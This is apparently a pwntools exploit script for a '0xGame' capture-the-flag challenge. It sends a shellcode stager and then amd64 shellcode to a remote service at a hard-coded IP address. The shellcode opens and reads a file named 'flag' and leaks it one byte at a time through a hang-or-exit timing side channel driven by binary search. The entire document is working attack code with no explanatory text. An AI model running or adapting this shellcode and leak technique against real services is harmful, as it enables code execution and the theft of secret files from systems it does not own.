from pwn import *
context(arch='amd64', os='linux', log_level='info')
flag="0xGame{"
while 1:    
    curr_pos=len(flag)
    left=32
    right=126
    while left!=right:
        warning(f"{curr_pos}: {left}~{right}")
        #s=process("../dist/pwn")
        s=remote("8.130.35.16",54000)
        #pause()
        s.sendafter(b"code:\n",asm("push rdx;pop rsi;push rdx;pop r15;xor rdi,rdi;xor rax,rax;syscall"))
        mid=int((left+right)/2)
        scbase=f"""
        push r15
        pop rdi
        xor rsi,rsi
        xor rdx,rdx
        push 2
        pop rax
        syscall
        push rdi
        pop rsi
        add rsi,0x600
        push rax
        pop rdi
        xor rax,rax
        inc dh
        syscall
        push rsi
        pop r14
        cmp byte ptr [r14+{curr_pos}],{mid}
        ja loop
        push 0x3b
        pop rax
        syscall
        loop:
        jmp loop
        """
        s.recvline()
        #pause()
        s.send(b"flag\0".ljust(0x10,b"\x90")+asm(scbase))
        #pause()
        try:
            dat=s.recv(timeout=1)
        except EOFError:
            right=mid
            s.close()
            continue
        left=mid+1
        #pause()
        s.close()
    flag+=chr(left)
    warning(flag)
    if flag[-1]=="}":
        success(flag)
        exit(0)
